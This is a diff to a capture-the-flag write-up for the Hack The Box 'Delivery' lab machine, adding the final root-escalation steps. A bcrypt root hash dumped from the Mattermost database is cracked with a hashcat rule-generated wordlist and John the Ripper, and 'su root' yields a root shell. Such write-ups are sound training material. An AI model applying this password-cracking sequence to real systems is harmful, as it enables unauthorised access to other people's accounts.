@@ -1,6 +1,5 @@
 # CTF - [Delivery](https://app.hackthebox.eu/machines/Delivery)
 
-## Enumeration:
 ```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -105,4 +104,33 @@ MariaDB [mattermost]> select id, Username, Password from Users;
 ```
 ```
 dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+```
+<br/><br/>
+Stored the hash in a file called `hash.txt`.
+<br/><br/>
+Looking back at our internal public channel on the website, someone in the chat mentioned that the password should be a variant of `PleaseSubscribe!`, they also mentioned that attackers could use hashcat rules to crack it.
+<br/><br/>
+Used hashcat to create variants of `PleaseSubscribe!`:
+```
+hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file.txt > dict.txt
+```
+Used johntheripper to crack the password:
+```
+└─$ john --wordlist=dict.txt hash.txt 
+Created directory: /home/ghost/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+PleaseSubscribe!21 (?)     
+1g 0:00:00:00 DONE (2021-11-18 22:35) 1.219g/s 87.80p/s 87.80c/s 87.80C/s PleaseSubscribe!..PlesPles
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+Root:PleaseSubscribe!21
+```
+maildeliverer@Delivery:~$ su root
+Password: 
+root@Delivery:/home/maildeliverer# 
 ```
